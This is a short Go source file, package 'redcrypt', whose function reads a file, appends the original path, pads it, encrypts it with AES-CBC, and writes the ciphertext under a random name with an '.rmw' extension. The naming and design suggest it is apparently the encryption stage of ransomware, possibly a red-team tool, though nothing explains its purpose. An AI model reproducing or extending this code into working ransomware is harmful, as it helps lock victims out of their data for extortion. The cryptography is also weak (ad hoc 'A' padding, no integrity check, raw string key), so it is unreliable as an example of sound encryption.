package redcrypt

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"math"
	"os"
)

const BlockSize = 16

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func randomBase64String(l int) string {
	buff := make([]byte, int(math.Ceil(float64(l)/float64(1.33333333333))))
	rand.Read(buff)
	str := base64.RawURLEncoding.EncodeToString(buff)
	return str[:l]
}

func Redcrypt(folderpath string, key string, filepath string) {
	keybytes := []byte(key)

	//Add file path to plaintext, to ensure we can identify what the original file was
	plaintextbytes, err := os.ReadFile(filepath)
	check((err))
	plaintextbytes = append(plaintextbytes, []byte(filepath)...)

	//Check block size and if not long enough pad it
	blockcheck := len(plaintextbytes) % aes.BlockSize
	var paddedbytes []byte
	if blockcheck != 0 {
		padding := bytes.Repeat([]byte("A"), (16 - blockcheck))
		paddedbytes = append(plaintextbytes, padding...)
	} else {
		paddedbytes = plaintextbytes
	}
	//Block
	block, err := aes.NewCipher(keybytes)
	if err != nil {
		panic(err)
	}

	//Initialisation vector
	ciphertext := make([]byte, aes.BlockSize+len(paddedbytes))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext[aes.BlockSize:], paddedbytes)

	// Create new encrypted file, including original extension
	rString := randomBase64String(16)
	efilepath := folderpath + string(rString) + ".rmw"
	err = os.WriteFile(efilepath, ciphertext, 0666)
	check(err)

	fmt.Printf("Encrypted file: %s\n:", string(efilepath))

}
